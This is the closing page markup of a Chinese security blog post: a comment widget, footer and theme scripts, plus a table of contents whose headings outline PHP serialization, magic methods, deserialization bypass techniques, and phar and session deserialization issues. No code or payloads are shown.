class="waline-comment-container"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline-meta.css"><script src="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.js"></script><div id="waline-comment"></div><script>function loadWaline(){Waline.init({el:"#waline-comment",serverURL:"https://waline-charmersix.vercel.app/",lang:"en",comment:".post-comments-count",reaction:!0})}window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E8%8A%82-php%E5%9F%BA%E7%A1%80%E3%80%81%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.</span> <span class="nav-text">第一节 php基础、类与对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-php%E4%B8%AD%E7%9A%84%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.1.</span> <span class="nav-text">0x1 php中的面向对象</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%80%9D%E6%83%B3"><span class="nav-number">1.1.1.</span> <span class="nav-text">面向对象的思想</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%89%B9%E7%82%B9"><span class="nav-number">1.1.2.</span> <span class="nav-text">php面向对象的特点</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%81%9A%E7%B1%BB"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">聚类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%81%E8%A3%85"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">封装</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9A%94%E7%A6%BB"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">隔离</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">继承</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%9A%E6%80%81"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">多态</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.2.</span> <span class="nav-text">0x2 类与对象</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95%E6%9D%83%E9%99%90"><span class="nav-number">1.2.1.</span> <span class="nav-text">类的属性和方法权限</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#public%E6%9D%83%E9%99%90"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">public权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#protected%E6%9D%83%E9%99%90"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">protected权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#private%E6%9D%83%E9%99%90"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">private权限</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="nav-number">1.2.2.</span> <span class="nav-text">类的属性</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%B1%9E%E6%80%A7"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">静态属性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#final%E5%B1%9E%E6%80%A7"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">final属性</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">1.2.3.</span> <span class="nav-text">类的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%BD%E8%B1%A1%E7%B1%BB"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">抽象类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%A5%E5%8F%A3"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">接口</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#trait"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">trait</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8C%BF%E5%90%8D%E7%B1%BB"><span class="nav-number">1.2.3.4.</span> <span class="nav-text">匿名类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.4.</span> <span class="nav-text">对象序列化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E8%8A%82-php%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.</span> <span class="nav-text">第二节 php的序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.1.</span> <span class="nav-text">0x3 序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.1.1.</span> <span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.1.2.</span> <span class="nav-text">反序列化</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x4-PHP%E4%B8%AD%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">2.2.</span> <span class="nav-text">0x4 PHP中的魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sleep%E5%92%8Cwakeup%E6%96%B9%E6%B3%95"><span class="nav-number">2.2.1.</span> <span class="nav-text">sleep和wakeup方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#construct%E5%92%8Cdestruct%E6%96%B9%E6%B3%95"><span class="nav-number">2.2.2.</span> <span class="nav-text">construct和destruct方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#call%E5%92%8CcallStatic%E6%96%B9%E6%B3%95"><span class="nav-number">2.2.3.</span> <span class="nav-text">call和callStatic方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#get%E3%80%81set%E5%92%8Cisset%E3%80%81unset"><span class="nav-number">2.2.4.</span> <span class="nav-text">get、set和isset、unset</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tostring%E6%96%B9%E6%B3%95"><span class="nav-number">2.2.5.</span> <span class="nav-text">tostring方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#invoke%E6%96%B9%E6%B3%95"><span class="nav-number">2.2.6.</span> <span class="nav-text">invoke方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#set-state%E6%96%B9%E6%B3%95"><span class="nav-number">2.2.7.</span> <span class="nav-text">set_state方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#debugInfo%E6%96%B9%E6%B3%95"><span class="nav-number">2.2.8.</span> <span class="nav-text">debugInfo方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.</span> <span class="nav-text">0x5 反序列化中的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-wakeup%E6%96%B9%E6%B3%95"><span class="nav-number">2.3.1.</span> <span class="nav-text">绕过__wakeup方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%B7%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">2.3.2.</span> <span class="nav-text">+号绕过正则匹配</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.3.</span> <span class="nav-text">引用绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ascii%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.4.</span> <span class="nav-text">Ascii码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exception%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.5.</span> <span class="nav-text">Exception绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.6.</span> <span class="nav-text">字符逃逸绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E8%8A%82-phar%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">第三节 phar的反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x6-%E4%BB%80%E4%B9%88%E6%98%AFphar"><span class="nav-number">3.1.</span> <span class="nav-text">0x6 什么是phar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x7-%E5%9F%BA%E4%BA%8Ephar%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.2.</span> <span class="nav-text">0x7 基于phar的反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#phar%E6%80%8E%E4%B9%88%E7%94%A8"><span class="nav-number">3.2.1.</span> <span class="nav-text">phar怎么用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar%E6%98%AF%E6%80%8E%E4%B9%88%E7%94%9F%E6%88%90%E7%9A%84"><span class="nav-number">3.2.2.</span> <span class="nav-text">phar是怎么生成的</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar%E6%98%AF%E6%80%8E%E4%B9%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84"><span class="nav-number">3.2.3.</span> <span class="nav-text">phar是怎么反序列化的</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.2.4.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E8%8A%82-session%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">4.</span> <span class="nav-text">第四节 session的反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x8-PHP%E4%B8%AD%E7%9A%84session%E6%9C%BA%E5%88%B6"><span class="nav-number">4.1.</span> <span class="nav-text">0x8 PHP中的session机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x9-session%E5%A4%84%E7%90%86handler%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-number">4.2.</span> <span class="nav-text">0x9 session处理handler引起的安全问题</span></a></li></ol></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2022.04.28</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate"></i> &nbsp;<a href="/">Charmersix</a></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item">Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp; Totalview&nbsp;<span id="busuanzi_value_site_pv"></span></div><div class="theme-info info-item">Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a></div></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script><div class="post-scripts"><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script></div></body></html>